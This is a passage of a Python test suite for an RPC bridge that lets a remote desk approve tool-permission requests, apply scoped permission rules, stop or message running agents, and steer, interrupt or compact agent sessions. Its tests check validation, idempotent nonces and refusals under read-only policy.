        self.r.ledger.put = lambda nonce, e: (claims.append(e) if "outcome" not in e else None,
                                              real_put(nonce, e))[1]
        for what, (name, args) in cases.items():
            with self.subTest(what):
                rpc = self.send(name, args)
                self.assertIn(self.refused(rpc, "bad-shape")["error"]["message"], self.ledger()[rpc["nonce"]]
                              ["outcome"]["error"]["message"], "kept as its one answer")
        self.assertEqual(claims, [], "nothing claimed, so nothing ran: a decision reaches the bridge only once claimed")
        deny = self.send("decide", {"session": sid, "decision": "deny", "digest": sq})
        self.assertEqual(self.outcome(deny), {"state": "done", "result": {}}, "a deny on a synchronous question")
        for rid in ("toolu_aq", "toolu_sq", "toolu_pp"):
            self.mod.settle(rid)

    def test_e_a_decision_refused_by_the_bridge_says_who_won_as_fields(self):
        """DX6 (composite bb8b8773): a 409 from the bridge is `not-pending`
        carrying `winner`, `by`, `terminalOnly` as the bridge gave them as
        fields, never read from its text."""
        settled = {"request": "toolu_w", "winner": "terminal", "outcome": "deny", "by": "terminal", "t": 1}
        cases = [
            ({"error": "already settled", "settled": settled}, {"winner": "terminal", "by": "terminal"}),
            ({"error": "already answered by %s; its settlement follows" % MEMBER, "by": MEMBER}, {"by": MEMBER}),
            ({"error": "the window for answering it from outside closed; the terminal answers it",
              "terminalOnly": True}, {"terminalOnly": True}),
            ({"error": "the terminal answered it; its settlement follows", "winner": "terminal", "by": "terminal"},
             {"winner": "terminal", "by": "terminal"}),
            ({"error": "already answered by cli; its settlement follows"}, {}),  # no field: nothing read from text
        ]
        for body, fields in cases:
            with mock.patch.object(rpcs.bridge, "request", return_value=(409, body)):
                with self.assertRaises(rpcs.Refused) as r:
                    rpcs.decide("/nowhere", "toolu_w", {"behavior": "allow", "by": MEMBER})
            error = r.exception.outcome["error"]
            self.assertEqual(error["code"], "not-pending", body)
            self.assertEqual({k: v for k, v in error.items() if k not in ("code", "message")}, fields, body)
            self.assertTrue(error["message"])

    def test_e_a_second_member_s_decision_names_the_first(self):
        tool_input = {"command": "make release"}
        self.mod.raise_("toolu_two", input_=tool_input)
        wait_for(lambda: self.request_info("toolu_two")[0] == 200)
        args = {"session": self.bridged.sid, "decision": "allow",
                "digest": digest_of(self.bridged.sid, "toolu_two", "Bash", tool_input)}
        self.assertEqual(self.outcome(self.send("decide", args)), {"state": "done", "result": {}})
        other = "0123456789abcdef0123456789abcdef"
        o = self.outcome(self.send("decide", dict(args, decision="deny"), member=other))
        self.assertEqual(o["error"]["code"], "not-pending")
        self.assertEqual(o["error"]["by"], MEMBER, "the first answerer, from the bridge's field")
        self.assertNotIn("winner", o["error"], "nothing is settled yet")
        self.mod.settle("toolu_two", outcome="allow", winner="web", by=MEMBER)
        # A background window past its deadline: the terminal's alone now.
        self.mod.raise_("toolu_win", input_=tool_input, agentId="a1", deadline=int(time.time() * 1000) - 1000)
        wait_for(lambda: self.request_info("toolu_win")[0] == 200)
        o = self.outcome(self.send("decide", dict(args, digest=digest_of(self.bridged.sid, "toolu_win", "Bash",
                                                                         tool_input))))
        self.assertEqual((o["error"]["code"], o["error"].get("terminalOnly")), ("not-pending", True))
        self.mod.settle("toolu_win", outcome="allow", winner="terminal", by="terminal")

    def test_e_an_answer_goes_to_its_question(self):
        q = {"questions": [{"question": "Which?", "options": [{"label": "A"}, {"label": "B"}]}]}
        self.mod.raise_("toolu_q1", tool="AskUserQuestion", input_=q)
        wait_for(lambda: self.request_info("toolu_q1")[0] == 200)
        rpc = self.send("answer", {"session": self.bridged.sid, "answers": {"Which?": "B"},
                                   "digest": digest_of(self.bridged.sid, "toolu_q1", "AskUserQuestion", q)})
        self.assertEqual(self.outcome(rpc), {"state": "done", "result": {}})
        status, body = self.mod_wait("toolu_q1")
        self.assertEqual(body["decision"], {"behavior": "allow", "updatedInput": {"answers": {"Which?": "B"}}})
        self.mod.settle("toolu_q1", outcome="answered", winner="web", by=MEMBER)

    # ------------------------------------------------ a scoped allow (MW3)

    SESSION_RULE = {"type": "addRules", "rules": [{"toolName": "Bash", "ruleContent": "npm test"}],
                    "behavior": "allow", "destination": "session"}
    LOCAL_RULE = dict(SESSION_RULE, destination="localSettings")
    DIRECTORY = {"type": "addDirectories", "directories": ["/w/other"], "destination": "session"}
    LOCAL_DIRECTORY = dict(DIRECTORY, destination="localSettings")
    MODE = {"type": "setMode", "mode": "acceptEdits", "destination": "session"}

    def scoped(self, rid, suggestions):
        """A Bash request raised with `suggestions`; its decide args, without a scope."""
        tool_input = {"command": "npm test"}
        self.mod.raise_(rid, input_=tool_input, suggestions=suggestions)
        wait_for(lambda: self.request_info(rid)[0] == 200)
        return {"session": self.bridged.sid, "decision": "allow",
                "digest": digest_of(self.bridged.sid, rid, "Bash", tool_input)}

    def test_m3_a_scoped_allow_hands_the_bridge_the_suggestion_at_its_index_with_its_destination(self):
        """DX6 `decide.scope` (§7, MW3): the rule is resolved from the
        request the bridge still holds, never from the browser; `session` in
        place of any destination, or the suggestion's own `localSettings`."""
        listed = [self.SESSION_RULE, self.LOCAL_RULE, self.DIRECTORY, self.LOCAL_DIRECTORY]
        cases = [(0, "session", self.SESSION_RULE), (1, "session", self.SESSION_RULE),
                 (1, "localSettings", self.LOCAL_RULE), (2, "session", self.DIRECTORY),
                 (3, "localSettings", self.LOCAL_DIRECTORY)]
        for n, (index, destination, rule) in enumerate(cases):
            with self.subTest(index=index, destination=destination):
                rid = "toolu_sc%d" % n
                args = self.scoped(rid, listed)
                args["scope"] = {"suggestion": index, "sha256": codes.input_sha256(listed[index]),
                                 "destination": destination}
                self.assertEqual(self.outcome(self.send("decide", args)), {"state": "done", "result": {}})
                status, body = self.mod_wait(rid)
                self.assertEqual(status, 200, body)
                self.assertEqual(body["decision"], {"behavior": "allow", "updatedPermissions": [rule]})
                self.mod.settle(rid, outcome="allow", winner="web", by=MEMBER)

    def test_m3_a_scope_the_request_does_not_bear_is_refused_before_the_claim(self):
        """The hash binds the suggestion as the browser drew it: a list that
        changed under the card (another hash, an index past it) is
        `not-pending` *the suggestions changed*; a type but a rule or a
        directory, or a `localSettings` the suggestion did not offer, is
        `bad-shape`, and so is a scope's shape (a destination outside the
        two, a scope on a deny). Nothing is claimed; nothing reaches the
        bridge."""
        listed = [self.SESSION_RULE, self.MODE, dict(self.SESSION_RULE, type="replaceRules"),
                  dict(self.SESSION_RULE, type="removeRules"), dict(self.DIRECTORY, type="removeDirectories")]
        args = self.scoped("toolu_scx", listed)
        sha = codes.input_sha256
        changed = sha(dict(self.SESSION_RULE, rules=[{"toolName": "Bash", "ruleContent": "npm *"}]))
        cases = {
            "another hash": ("not-pending", {"suggestion": 0, "sha256": changed, "destination": "session"}),
            "an index past the list": ("not-pending", {"suggestion": 5, "sha256": sha(self.SESSION_RULE),
                                                       "destination": "session"}),
            "a localSettings not offered": ("bad-shape", {"suggestion": 0, "sha256": sha(self.SESSION_RULE),
                                                          "destination": "localSettings"}),
            "setMode": ("bad-shape", {"suggestion": 1, "sha256": sha(self.MODE), "destination": "session"}),
            "replaceRules": ("bad-shape", {"suggestion": 2, "sha256": sha(listed[2]), "destination": "session"}),
            "removeRules": ("bad-shape", {"suggestion": 3, "sha256": sha(listed[3]), "destination": "session"}),
            "removeDirectories": ("bad-shape", {"suggestion": 4, "sha256": sha(listed[4]),
                                                "destination": "session"}),
            "userSettings": ("bad-shape", {"suggestion": 0, "sha256": sha(self.SESSION_RULE),
                                           "destination": "userSettings"}),
            "projectSettings": ("bad-shape", {"suggestion": 0, "sha256": sha(self.SESSION_RULE),
                                              "destination": "projectSettings"}),
            "a negative index": ("bad-shape", {"suggestion": -1, "sha256": sha(self.SESSION_RULE),
                                               "destination": "session"}),
            "an index that is no integer": ("bad-shape", {"suggestion": True, "sha256": sha(self.SESSION_RULE),
                                                          "destination": "session"}),
            "a hash that is no SHA-256": ("bad-shape", {"suggestion": 0, "sha256": "ab", "destination": "session"}),
            "a scope that is no object": ("bad-shape", [0]),
        }
        claims = []
        real_put = self.r.ledger.put
        self.r.ledger.put = lambda nonce, e: (claims.append(e) if "outcome" not in e else None,
                                              real_put(nonce, e))[1]
        for what, (code, scope) in cases.items():
            with self.subTest(what):
                o = self.refused(self.send("decide", dict(args, scope=scope)), code)
                if code == "not-pending":
                    self.assertIn("the suggestions changed", o["error"]["message"])
        with self.subTest("a scope on a deny"):
            self.refused(self.send("decide", dict(args, decision="deny", scope={
                "suggestion": 0, "sha256": sha(self.SESSION_RULE), "destination": "session"})), "bad-shape")
        none = self.scoped("toolu_scnone", None)
        with self.subTest("a request raised without suggestions"):
            o = self.refused(self.send("decide", dict(none, scope={
                "suggestion": 0, "sha256": sha(self.SESSION_RULE), "destination": "session"})), "not-pending")
            self.assertIn("the suggestions changed", o["error"]["message"])
        self.assertEqual(claims, [], "nothing claimed, so nothing reached the bridge")
        self.r.ledger.put = real_put
        status, _ = self.mod_wait("toolu_scx")
        self.assertEqual(status, 204, "no decision was handed out")
        for rid in ("toolu_scx", "toolu_scnone"):
            self.mod.settle(rid)

    def test_m3_a_scoped_allow_on_a_read_only_machine_is_refused(self):
        args = dict(self.scoped("toolu_scro", [self.SESSION_RULE]), scope={
            "suggestion": 0, "sha256": codes.input_sha256(self.SESSION_RULE), "destination": "session"})
        tpr.set_policy({"read_only": True})
        self.refused(self.send("decide", args), "read-only")
        self.mod.settle("toolu_scro")

    def request_info(self, rid):
        import sminos_bridge as bridge
        return bridge.request(bridge.endpoint(self.bridged.sid), "GET", "/requests/" + rid)

    def mod_wait(self, rid):
        import sminos_bridge as bridge
        return bridge.request(bridge.endpoint(self.bridged.sid), "GET", "/requests/%s/wait?ms=5000" % rid)

    def test_e_what_a_session_without_a_bridge_cannot_do_is_unsupported(self):
        for name, args in (("interrupt", {"session": self.plain.sid}),
                           ("model", {"session": self.plain.sid, "effort": "high"}),
                           ("compact", {"session": self.plain.sid}),
                           ("decide", {"session": self.plain.sid, "decision": "allow",
                                       "digest": digest_of(self.plain.sid, "toolu_x", "Bash", {})}),
                           ("steer", {"session": self.ended, "text": "x"}),
                           ("interrupt", {"session": self.ended}),
                           ("stop", {"session": self.plain.sid, "taskId": "bplain1"}),
                           ("stop", {"session": self.ended, "taskId": "bended1"}),
                           ("command", {"session": self.plain.sid, "name": "rename", "args": "x"}),
                           ("command", {"session": self.ended, "name": "rename", "args": "x"})):
            self.refused(self.send(name, args), "unsupported")
        self.assertEqual(self.mod.commands, [], "nothing reached a bridge")

    # ------------------------------------------------ stop a job (DC10)

    def test_k_stop_a_running_job_the_main_loops_or_a_subagents(self):
        """DX6 `stop`: a background shell of the main loop and a monitor of a
        subagent, each the session's jobs hold as running, stopped through
        the bridge (DX5 `stop`), answered `{taskId}`."""
        start_job(self.bridged.sid, "bmain1")
        start_job(self.bridged.sid, "magent1", kind="monitor", agent="a1b2c3")
        for task in ("bmain1", "magent1"):
            o = self.outcome(self.send("stop", {"session": self.bridged.sid, "taskId": task}))
            self.assertEqual(o, {"state": "done", "result": {"taskId": task}})
        self.assertEqual([(c["taskId"], c.get("from")) for c in self.mod.ops("stop")],
                         [("bmain1", "desk"), ("magent1", "desk")])
        # Stopped, recorded in the session's rows: a second Stop of either finds no running task.
        for task in ("bmain1", "magent1"):
            self.refused(self.send("stop", {"session": self.bridged.sid, "taskId": task}), "unknown-task")
        self.assertEqual(len(self.mod.ops("stop")), 2)

    def test_k_a_task_the_jobs_do_not_hold_running_is_unknown_task_before_the_claim(self):
        """G3: a task never started, one that ended, one of another session,
        a subagent's call that started nothing: refused `unknown-task`, never
        sent to the bridge, and the nonce never claimed."""
        start_job(self.bridged.sid, "bdone1")
        end_job(self.bridged.sid, "bdone1", "completed")
        start_job(self.bridged.sid, "bkill1")
        end_job(self.bridged.sid, "bkill1", "killed")
        start_job(self.plain.sid, "bother1")
        claims = []
        real = rpcs.Ledger.put

        def put(ledger, nonce, entry):
            if "outcome" not in entry:
                claims.append(nonce)
            return real(ledger, nonce, entry)

        with mock.patch.object(rpcs.Ledger, "put", put):
            for task in ("bnever1", "bdone1", "bkill1", "bother1"):
                self.refused(self.send("stop", {"session": self.bridged.sid, "taskId": task}), "unknown-task")
        self.assertEqual(claims, [], "refused before any claim")
        self.assertEqual(self.mod.ops("stop"), [])

    def test_k_a_malformed_task_id_is_bad_shape(self):
        for task in ("", "a" * 65, "b 1", "b.1", None, 7):
            self.refused(self.send("stop", {"session": self.bridged.sid, "taskId": task}), "bad-shape")
        self.refused(self.send("stop", {"session": self.bridged.sid}), "bad-shape")
        self.assertEqual(self.mod.ops("stop"), [])

    def test_k_an_engine_refusal_fails_the_rpc_in_its_words(self):
        """G4: TaskStop's error is the RPC's `failed`, with the engine's own
        message."""
        start_job(self.bridged.sid, "bstuck1")
        self.mod.stop_fails["bstuck1"] = "Task bstuck1 is not running (status: completed)"
        o = self.outcome(self.send("stop", {"session": self.bridged.sid, "taskId": "bstuck1"}))
        self.assertEqual(o, {"state": "failed", "error": {"code": "failed",
                                                          "message": "Task bstuck1 is not running (status: completed)"}})

    def test_k_a_retried_nonce_never_stops_twice(self):
        start_job(self.bridged.sid, "bonce1")
        nonce = codes.b64url(os.urandom(16))
        first = self.send("stop", {"session": self.bridged.sid, "taskId": "bonce1"}, nonce=nonce)
        self.assertEqual(self.outcome(first)["state"], "done")
        self.r.reset()
        self.send("stop", {"session": self.bridged.sid, "taskId": "bonce1"}, nonce=nonce)
        self.assertEqual(len(results(self.r.opening(self.pid), nonce)), 1, "answered from the ledger")
        self.assertEqual(len(self.mod.ops("stop")), 1, "TaskStop ran once")

    # ------------------------------------------------ one agent stopped or told (MW4)

    def spawn_agent(self, agent_id, name=None, stopped=False):
        """An agent in the session's tree as the mod reports one: its spawn,
        and its stop when `stopped`."""
        self.mod.post({"type": "agent", "phase": "spawn", "agentId": agent_id, "parentAgentId": None,
                       "subagentType": "general-purpose", "description": "a task", "name": name,
                       "background": True, "toolUseId": "toolu_" + agent_id})
        if stopped:
            self.mod.post({"type": "agent", "phase": "stop", "agentId": agent_id, "agentType": "general-purpose",
                           "status": "killed"})

    def test_n_stop_agent_by_id_and_by_a_name_with_a_space(self):
        """DX6 `stop-agent`: an agent the tree holds as running, by its id or
        its name, stopped through the bridge (DX5 `stop-agent`, from the desk,
        carrying the nonce and the id the tree resolved the spelling to, which
        alone the bridge acts on), answered with the spelling asked and, for
        a name, the id it resolved to."""
        self.spawn_agent("aid0000000000001", name="bg sleeper")
        self.spawn_agent("aid0000000000002")
        by_id = self.send("stop-agent", {"session": self.bridged.sid, "agentId": "aid0000000000002"})
        self.assertEqual(self.outcome(by_id), {"state": "done", "result": {"agentId": "aid0000000000002",
                                                                            "accepted": True}})
        by_name = self.send("stop-agent", {"session": self.bridged.sid, "agentId": "bg sleeper"})
        self.assertEqual(self.outcome(by_name), {"state": "done", "result": {
            "agentId": "bg sleeper", "accepted": True, "resolvedAgentId": "aid0000000000001"}})
        self.assertEqual([(c["agentId"], c.get("resolvedAgentId"), c.get("from"), c.get("rpc"))
                          for c in self.mod.ops("stop-agent")],
                         [("aid0000000000002", "aid0000000000002", "desk", by_id["nonce"]),
                          ("bg sleeper", "aid0000000000001", "desk", by_name["nonce"])])

    def test_n_the_tree_resolves_an_id_first_then_one_running_name_never_a_shared_one(self):
        """The spelling is an id when the tree holds that id, else the name
        of exactly one running agent; a name two running agents hold is
        refused `ambiguous-agent` before the claim, naming both ids."""
        self.spawn_agent("aid0000000000020", name="twin")
        self.spawn_agent("aid0000000000021", name="twin")
        self.spawn_agent("aid0000000000022", name="aid0000000000023")
        self.spawn_agent("aid0000000000023")
        self.spawn_agent("aid0000000000024", name="reborn", stopped=True)
        self.spawn_agent("aid0000000000025", name="reborn")
        for name, args in (("stop-agent", {}), ("tell", {"text": "hi"})):
            o = self.send(name, {"session": self.bridged.sid, "agentId": "twin", **args})
            self.refused(o, "ambiguous-agent")
            self.assertIn("aid0000000000020", self.outcome(o)["error"]["message"])
            self.assertIn("aid0000000000021", self.outcome(o)["error"]["message"])
        self.assertEqual(self.mod.ops("stop-agent") + self.mod.ops("tell"), [])
        for ref in ("aid0000000000023", "reborn"):
            self.assertEqual(self.outcome(self.send("tell", {"session": self.bridged.sid, "agentId": ref,
                                                             "text": "hi"}))["state"], "done")
        self.assertEqual([c["resolvedAgentId"] for c in self.mod.ops("tell")], ["aid0000000000023", "aid0000000000025"])

    def test_n_a_teammates_address_is_an_id_as_the_tree_spells_it(self):
        """A teammate's id is `<name>@<team>`, no task id's shape: taken by
        the tree's spelling alone, and passed to the bridge as resolved."""
        self.spawn_agent("worker@team", name="worker")
        for ref in ("worker@team", "worker"):
            o = self.send("tell", {"session": self.bridged.sid, "agentId": ref, "text": "hi"})
            self.assertEqual(self.outcome(o), {"state": "done", "result": {"sent": True}})
        o = self.outcome(self.send("stop-agent", {"session": self.bridged.sid, "agentId": "worker"}))
        self.assertEqual(o["result"], {"agentId": "worker", "accepted": True, "resolvedAgentId": "worker@team"})
        self.assertEqual([c["resolvedAgentId"] for c in self.mod.ops("tell") + self.mod.ops("stop-agent")],
                         ["worker@team"] * 3)

    def test_n_a_note_the_session_did_not_keep_is_in_the_result(self):
        self.spawn_agent("aid0000000000026", name="unnoted")
        self.mod.note_error = "refused by a hook"
        o = self.outcome(self.send("stop-agent", {"session": self.bridged.sid, "agentId": "unnoted"}))
        self.assertEqual(o, {"state": "done", "result": {"agentId": "unnoted", "accepted": True,
                                                         "resolvedAgentId": "aid0000000000026",
                                                         "noteError": "refused by a hook"}})

    def test_n_tell_a_running_agent(self):
        self.spawn_agent("aid0000000000003", name="reader")
        o = self.outcome(self.send("tell", {"session": self.bridged.sid, "agentId": "reader", "text": "also the cache"}))
        self.assertEqual(o, {"state": "done", "result": {"sent": True}})
        self.assertEqual([(c["agentId"], c["resolvedAgentId"], c["text"]) for c in self.mod.ops("tell")],
                         [("reader", "aid0000000000003", "also the cache")])

    def test_n_an_agent_the_tree_does_not_hold_running_is_unknown_agent_before_the_claim(self):
        """An id or name no agent of the session's tree has, an agent that
        ended, another session's, a description: refused `unknown-agent`,
        never sent to the bridge, and the nonce never claimed."""
        self.spawn_agent("aid0000000000004", name="gone one", stopped=True)
        self.spawn_agent("aid0000000000005", name="live one")
        claims = []
        real = rpcs.Ledger.put

        def put(ledger, nonce, entry):
            if "outcome" not in entry:
                claims.append(nonce)
            return real(ledger, nonce, entry)

        with mock.patch.object(rpcs.Ledger, "put", put):
            for ref in ("aid-never", "aid0000000000004", "gone one", "a task", "LIVE ONE"):
                self.refused(self.send("stop-agent", {"session": self.bridged.sid, "agentId": ref}), "unknown-agent")
                self.refused(self.send("tell", {"session": self.bridged.sid, "agentId": ref, "text": "hi"}),
                             "unknown-agent")
        self.assertEqual(claims, [], "refused before any claim")
        self.assertEqual(self.mod.ops("stop-agent") + self.mod.ops("tell"), [])

    def test_n_a_malformed_agent_or_text_is_bad_shape(self):
        self.spawn_agent("aid0000000000006", name="shaped")
        for ref in ("", "   ", "a\nb", "a\x00", "a\x7f", "x" * 129, None, 7):
            self.refused(self.send("stop-agent", {"session": self.bridged.sid, "agentId": ref}), "bad-shape")
            self.refused(self.send("tell", {"session": self.bridged.sid, "agentId": ref, "text": "hi"}), "bad-shape")
        for text in ("", "  ", None, 7):
            self.refused(self.send("tell", {"session": self.bridged.sid, "agentId": "shaped", "text": text}),
                         "bad-shape")
        self.refused(self.send("stop-agent", {"session": self.bridged.sid}), "bad-shape")
        self.assertEqual(self.mod.ops("stop-agent") + self.mod.ops("tell"), [])
        # 128 characters, a space among them, is a name.
        name = "n" * 63 + " " + "m" * 64
        self.spawn_agent("aid0000000000007", name=name)
        self.assertEqual(self.outcome(self.send("stop-agent", {"session": self.bridged.sid, "agentId": name}))["state"],
                         "done")

    def test_n_the_bridges_refusal_fails_the_rpc_with_its_code_first(self):
        """After the claim the bridge has the last word (the agent ended
        between the two checks; a send the engine refused): `failed`, its
        code the message's first word, as a command's refusal is."""
        self.spawn_agent("aid0000000000008", name="raced")
        self.mod.refuse_agents["raced"] = ("unknown-agent", "no running agent has the id or name raced")
        o = self.outcome(self.send("stop-agent", {"session": self.bridged.sid, "agentId": "raced"}))
        self.assertEqual(o, {"state": "failed", "error": {"code": "failed", "message":
                                                          "unknown-agent: no running agent has the id or name raced"}})
        self.mod.refuse_agents["aid0000000000008"] = (None, "the recipient is gone")
        o = self.outcome(self.send("tell", {"session": self.bridged.sid, "agentId": "aid0000000000008", "text": "x"}))
        self.assertEqual(o, {"state": "failed", "error": {"code": "failed", "message": "the recipient is gone"}})

    def test_n_stop_agent_and_tell_need_a_bridge_and_a_machine_that_runs_rpcs(self):
        self.spawn_agent("aid0000000000009", name="policed")
        self.refused(self.send("stop-agent", {"session": self.plain.sid, "agentId": "policed"}), "unsupported")
        self.refused(self.send("tell", {"session": self.ended, "agentId": "policed", "text": "x"}), "unsupported")
        tpr.set_policy({"read_only": True})
        self.refused(self.send("stop-agent", {"session": self.bridged.sid, "agentId": "policed"}), "read-only")
        self.refused(self.send("tell", {"session": self.bridged.sid, "agentId": "policed", "text": "x"}), "read-only")
        self.assertEqual(self.mod.ops("stop-agent") + self.mod.ops("tell"), [])

    def test_n_a_retried_nonce_never_stops_or_tells_twice(self):
        self.spawn_agent("aid0000000000010", name="once")
        for name, args in (("stop-agent", {"agentId": "once"}), ("tell", {"agentId": "once", "text": "x"})):
            nonce = codes.b64url(os.urandom(16))
            first = self.send(name, {"session": self.bridged.sid, **args}, nonce=nonce)
            self.assertEqual(self.outcome(first)["state"], "done")
            self.r.reset()
            self.send(name, {"session": self.bridged.sid, **args}, nonce=nonce)
            self.assertEqual(len(results(self.r.opening(self.pid), nonce)), 1, "answered from the ledger")
            self.assertEqual(len(self.mod.ops(name)), 1, "%s ran once" % name)

    def test_n_a_stop_or_tell_claimed_before_a_stop_is_reconciled_from_the_childs_kept_answer(self):
        """The daemon stops after the claim, with the op on its way: the
        bridge's child keeps the mod's answer under the nonce, which the next
        daemon reads as the outcome, not `interrupted`; one the child kept no
        answer for is `interrupted` once its window has passed."""
        now = time.time()
        path = rpcs.bridge.endpoint(self.bridged.sid)
        stop_nonce, tell_nonce, lost_nonce = "SSSSSSSSSSSSSSSSSSSSSA", "TTTTTTTTTTTTTTTTTTTTTA", "UUUUUUUUUUUUUUUUUUUUUA"
        self.claim(stop_nonce, "stop-agent", self.bridged.sid, now)
        self.claim(tell_nonce, "tell", self.bridged.sid, now)
        self.claim(lost_nonce, "tell", self.bridged.sid, now)
        stopped = rpcs.stop_agent(path, "kept one", "aid0000000000011", stop_nonce)
        told = rpcs.tell(path, "kept one", "aid0000000000011", "x", tell_nonce)
        r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])
        frames = r.due({self.pid})
        self.assertEqual(results(frames, stop_nonce), [stopped])
        self.assertEqual(stopped["result"], {"agentId": "kept one", "accepted": True, "resolvedAgentId": "aid0000000000011"})
        self.assertEqual(results(frames, tell_nonce), [told])
        self.assertEqual(results(frames, lost_nonce), [], "its answer may still come, so it waits")
        self.clock[0] = now + rpcs.STEER_TRACE_S + 1
        self.assertEqual([x["error"]["code"] for x in results(r.due({self.pid}), lost_nonce)], ["interrupted"])

    # ------------------------------------------------ execution, through DC2's protocol

    def test_f_steer_interrupt_model(self):
        import sminos_bridge as bridge
        self.mod.post({"type": "model", "model": None, "effort": None})
        wait_for(lambda: bridge.load_kept(self.bridged.sid)["override"] is None)
        idle = self.send("steer", {"session": self.bridged.sid, "text": "too late"})
        self.refused(idle, "idle")
        self.mod.turn = "turn-1"
        steer = self.send("steer", {"session": self.bridged.sid, "text": "also check the docs"})
        o = self.outcome(steer)
        self.assertEqual(o["state"], "done", o)
        self.assertEqual(o["result"], {"row": self.mod.rows[-1]}, "the appended row's uuid")
        self.assertEqual([c["text"] for c in self.mod.ops("steer")], ["too late", "also check the docs"])
        intr = self.send("interrupt", {"session": self.bridged.sid})
        self.assertEqual(self.outcome(intr), {"state": "done", "result": {"turnId": "turn-1", "stopped": ["b1x2y3z4"],
                                                                         "running": []}})
        self.assertEqual(self.mod.ops("interrupt")[-1].get("from"), "desk",
                         "the record the mod leaves the model says the interrupt came from the desk")
        model = self.send("model", {"session": self.bridged.sid, "model": "claude-opus-4-1"})
        self.assertEqual(self.outcome(model), {"state": "done", "result": {"model": "claude-opus-4-1",
                                                                           "effort": None}})
        # The choice in force: an effort alone keeps the model chosen before.
        self.mod.post({"type": "model", "model": "claude-opus-4-1", "effort": None})
        wait_for(lambda: (bridge.load_kept(self.bridged.sid)["override"] or {}).get("model"))
        effort = self.send("model", {"session": self.bridged.sid, "effort": "high"})
        self.assertEqual(self.outcome(effort), {"state": "done", "result": {"model": "claude-opus-4-1",
                                                                            "effort": "high"}})
        self.assertEqual(self.mod.ops("model")[-1]["model"], "claude-opus-4-1")
        back = self.send("model", {"session": self.bridged.sid, "model": "default"})
        self.assertEqual(self.outcome(back)["state"], "done")
        self.assertEqual(self.mod.ops("model")[-1]["model"], "default")

    def test_f_a_turn_state_unknown_is_a_failure_with_the_bridges_reason(self):
        """After a load into a conversation the bridge cannot tell whether a
        turn runs: it refuses rather than guess, and so does the RPC — never
        a success, and never `idle`."""
        self.mod.unknown = True
        for name in ("steer", "interrupt", "compact"):
            args = {"session": self.bridged.sid, **({"text": "x"} if name == "steer" else {})}
            self.assertEqual(self.outcome(self.send(name, args)),
                             {"state": "failed", "error": {"code": "failed", "message": TURN_UNKNOWN}}, name)

    def test_f_a_steer_to_a_session_without_a_bridge_takes_sminos_steer(self):
        # Its engine record says idle: no turn runs, so nothing is steered (composite 21c32db7).
        self.here.live[self.plain.sid]["status"] = "idle"
        self.refused(self.send("steer", {"session": self.plain.sid, "text": "not now"}), "idle")
        self.assertNotIn("not now", self.plain.inbox.texts())
        self.here.live[self.plain.sid]["status"] = "busy"
        rpc = self.send("steer", {"session": self.plain.sid, "text": "-n also the changelog"})
        self.assertEqual(self.outcome(rpc, timeout=30), {"state": "done", "result": {"row": None}},
                         "delivered; no row is named without a bridge")
        self.assertTrue(wait_for(lambda: "-n also the changelog" in self.plain.inbox.texts()),
                        "as a cross-session frame on its inbox (§5): %r" % self.plain.inbox.texts())

    def test_f_compact_answers_at_once_and_its_outcome_follows_carrying_the_nonce(self):
        reqs = requests.Requests(KEY, "testhost")
        reqs.follow({self.bridged.sid: self.pid})
        try:
            self.mod.turn = "turn-2"
            held = self.send("compact", {"session": self.bridged.sid})
            self.assertEqual(self.outcome(held), {"state": "done", "result": {"at": "turn-end"}})
            self.mod.turn = None
            now = self.send("compact", {"session": self.bridged.sid})

            def compacts():
                reqs.take()
                self.r.compacted(reqs.take_compacts())
                return [f["message"] for f in self.collect() if f.get("t") == "session"
                        and f["message"]["kind"] == "compact" and f["message"]["body"]["rpc"] == now["nonce"]]
            got = wait_for(lambda: len(compacts()) >= 2 and compacts())
            self.assertTrue(got, "the compaction's start and end, as DX4 compact")
            self.assertEqual(results(self.frames, now["nonce"]), [{"state": "done", "result": {"at": "now"}}])
            self.assertEqual([m["body"] for m in got],
                             [{"rpc": now["nonce"], "phase": "start"},
                              {"rpc": now["nonce"], "phase": "end", "tokensBefore": 9000, "tokensAfter": 1200}])
            m = got[0]
            self.assertEqual((m["project"], m["machine"], m["session"], m["sub"], m["n"]),
                             (self.pid, "testhost", self.bridged.sid, None, None))
        finally:
            reqs.close()

    # ------------------------------------------------ a desk command (the desk control surface's M0)

    def op_messages(self, reqs=None):
        """The DX4 `op` messages gone up so far, the bridge's `run` events read first."""
        if reqs is not None:
            reqs.take()
            self.r.ops(reqs.take_ops())
        return [f["message"] for f in self.collect() if f.get("t") == "session" and f["message"]["kind"] == "op"]

    def following(self):
        reqs = requests.Requests(KEY, "testhost")
        reqs.follow({self.bridged.sid: self.pid})
        self.addCleanup(reqs.close)
        self.assertTrue(wait_for(lambda: reqs.take() or self.bridged.sid in reqs.synced))
        return reqs

    def test_m1_cd_refuses_unknown_relative_and_subdirectories_before_forwarding(self):
        for path in (self.other_root, ".", self.root + "/.git", self.root + "/missing"):
            self.refused(self.send("command", {"session": self.bridged.sid, "name": "cd", "args": path}),
                         "unknown-checkout")
        self.assertEqual(self.mod.ops("command"), [])

    def test_m1_cd_optional_args_fail_under_the_nonce_and_leave_the_receiver_usable(self):
        for optional in ({}, {"args": None}):
            with self.subTest(optional=optional):
                self.refused(self.send("command", {"session": self.bridged.sid, "name": "cd", **optional}),
                             "unknown-checkout")
        self.assertEqual(self.mod.ops("command"), [])
        valid = self.send("command", {"session": self.bridged.sid, "name": "cd", "args": self.root})
        self.assertEqual(self.outcome(valid)["state"], "done")
        self.assertEqual(len(self.mod.ops("command")), 1)

    def test_m1_cd_malformed_paths_fail_under_the_nonce_and_leave_the_receiver_usable(self):
        for path in (self.root + "/\x00bad", self.root + "/없는-경로"):
            with self.subTest(path=path):
                self.refused(self.send("command", {"session": self.bridged.sid, "name": "cd", "args": path}),
                             "unknown-checkout")
        # Lone surrogates have no canonical signed representation: a wire
        # request holding one is refused by the code check, before path APIs.
        invalid = sign(KEY, "command", self.pid, {"session": self.bridged.sid, "name": "cd", "args": self.root})
        invalid["args"]["args"] = self.root + "/\ud800"
        self.r.receive(invalid, self.here)
        self.refused(invalid, "bad-code")
        self.assertEqual(self.mod.ops("command"), [])
        valid = self.send("command", {"session": self.bridged.sid, "name": "cd", "args": self.root})
        self.assertEqual(self.outcome(valid)["state"], "done")
        self.assertEqual(len(self.mod.ops("command")), 1)

    def test_m1_cd_forwards_only_the_canonical_known_checkout_and_stays_read_only(self):
        args = {"session": self.bridged.sid, "name": "cd", "args": "  " + self.root + "/./  "}
        asked = self.send("command", args)
        self.assertEqual(self.outcome(asked)["state"], "done")
        self.assertEqual(self.mod.ops("command")[-1]["args"], os.path.realpath(self.root))
